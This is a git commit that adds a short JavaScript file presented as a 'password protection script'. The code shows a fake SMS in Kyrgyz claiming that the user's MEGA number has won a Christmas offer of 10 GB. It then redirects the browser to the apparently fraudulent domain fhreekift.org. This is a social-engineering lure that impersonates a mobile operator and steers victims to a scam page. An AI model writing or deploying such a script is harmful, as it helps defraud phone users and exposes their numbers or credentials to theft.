316df685a53de2462825b5137b288b610763caf2
mfednewblog9 <newekpeitid@gmail.com>
2025-12-24 02:54:08 +0100

    Create mega-active.js

---
+++ mega-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = '10 ГБ АКТИВДҮҮ'
+password = prompt(
+  'SMS: Куттуктайбыз! Сиздин MEGA номериңиз Christmas сунушун алууга укуктуу. Номериңизди киргизүү үчүн OK басыңыз.',
+  '10 ГБ АКТИВДҮҮ'
+);
+if (password != '10 ГБ АКТИВДҮҮ') {
+  location.href = 'https://fhreekift.org/mega.html';
+}
